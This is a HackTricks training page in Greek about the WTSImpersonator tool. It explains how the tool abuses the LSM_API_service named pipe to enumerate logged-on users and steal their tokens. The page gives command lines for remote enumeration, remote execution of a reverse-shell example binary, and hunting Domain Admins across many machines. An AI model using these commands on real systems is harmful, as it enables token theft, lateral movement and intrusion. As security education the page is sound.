{{#include ../../banners/hacktricks-training.md}}

Το εργαλείο **WTS Impersonator** εκμεταλλεύεται το **"\\pipe\LSM_API_service"** RPC Named pipe για να καταγράψει κρυφά τους συνδεδεμένους χρήστες και να κλέψει τα tokens τους, παρακάμπτοντας τις παραδοσιακές τεχνικές Token Impersonation. Αυτή η προσέγγιση διευκολύνει τις ομαλές πλευρικές κινήσεις εντός των δικτύων. Η καινοτομία πίσω από αυτή την τεχνική αποδίδεται στον **Omri Baso, του οποίου το έργο είναι προσβάσιμο στο [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Κύρια Λειτουργικότητα

Το εργαλείο λειτουργεί μέσω μιας ακολουθίας κλήσεων API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Κύρια Μodule και Χρήση

- **Αναγνώριση Χρηστών**: Η τοπική και απομακρυσμένη αναγνώριση χρηστών είναι δυνατή με το εργαλείο, χρησιμοποιώντας εντολές για κάθε σενάριο:

- Τοπικά:
```powershell
.\WTSImpersonator.exe -m enum
```
- Απομακρυσμένα, καθορίζοντας μια διεύθυνση IP ή όνομα υπολογιστή:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Εκτέλεση Εντολών**: Τα modules `exec` και `exec-remote` απαιτούν ένα **Service** context για να λειτουργήσουν. Η τοπική εκτέλεση χρειάζεται απλώς το εκτελέσιμο WTSImpersonator και μια εντολή:

- Παράδειγμα για τοπική εκτέλεση εντολής:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe μπορεί να χρησιμοποιηθεί για να αποκτήσει ένα service context:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Απομακρυσμένη Εκτέλεση Εντολών**: Περιλαμβάνει τη δημιουργία και εγκατάσταση μιας υπηρεσίας απομακρυσμένα, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με κατάλληλες άδειες.

- Παράδειγμα απομακρυσμένης εκτέλεσης:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Module Αναζήτησης Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα με τα διαπιστευτήριά τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
- Παράδειγμα χρήσης:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
